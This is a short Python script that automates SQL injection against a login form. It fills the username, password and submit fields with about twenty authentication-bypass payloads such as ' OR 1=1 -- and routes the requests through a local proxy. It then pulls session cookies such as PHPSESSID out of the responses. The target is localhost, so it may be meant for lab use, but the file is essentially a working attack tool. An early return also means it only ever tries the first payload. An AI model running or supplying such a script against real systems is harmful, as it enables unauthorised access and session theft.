import requests
import re

def send_sql_injection_request(url, formDataNames):
    sqli_payloads = [
        '\' || 1=1 # ',
        '\'; SELECT * FROM users LIMIT 0, 1 -- ',
        '"; SELECT * FROM users LIMIT 0, 1 -- ',
        '\'); SELECT * FROM users LIMIT 0, 1 -- ',
        '"); SELECT * FROM users LIMIT 0, 1 -- ',
        '\' OR 1=1 -- ',
        '\') OR 1=1 -- ',
        '") OR 1=1 -- ',
        '" OR 1=1 -- ',
        '\' || 1=\'1',
        '" || 1="1',
        '") || 1=")1',
        '\') || 1=\')1',
        '\' || username="admin" -- ',
        '\') || username="admin" -- ',
        '") || username="admin" -- ',
        '" || username="admin" -- ',
        '" || 1=1 # ',
        '") || 1=1 # ',
        '\') || 1= 1 # ',
    ]

    for sqli_payload in sqli_payloads:
        try:
            formData = {}
            for name in formDataNames:
                if name:
                    formData[name] = sqli_payload

            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            proxyAgent = 'http://0.0.0.0:1234'
            response = requests.post(url, data=formData, headers=headers, proxies={'http': proxyAgent, 'https': proxyAgent})
            responseBody = response.text
            print(responseBody)

            cookies = {}
            cookieRegex = r'(?:PHPSESSID|JSESSIONID|ASP.NET_SessionId|sessionid|rails_session|connect.sid|sid|Token|AuthCookie)=([^;]+)'
            bodyRegex = r"(?:Welcome|Hello|Logged in|User|Dashboard|Home)[\w\s,!:]{10,100}"  # Adjust the range as needed
            responseCookies = response.headers.get('Set-Cookie')
            if not responseCookies:
                responseCookies = response.headers.get('Cookie')

            print(f"All headers: {response.headers.items()}")
            bodyMatches = re.findall(bodyRegex, responseBody)
            print("BODY Match:", bodyMatches)
            print(responseCookies)

            if responseCookies:
                cookieMatches = re.findall(cookieRegex, responseCookies)
                print('Cookie Matches:', cookieMatches)
                if cookieMatches and bodyMatches:
                    return {'cookie': cookieMatches}
            return False
        except Exception as e:
            print('Error sending POST request:', e)

    return False

url = 'http://localhost:8080/login'
formDataNames = ['username', 'password', 'submit']
print(send_sql_injection_request(url, formDataNames))
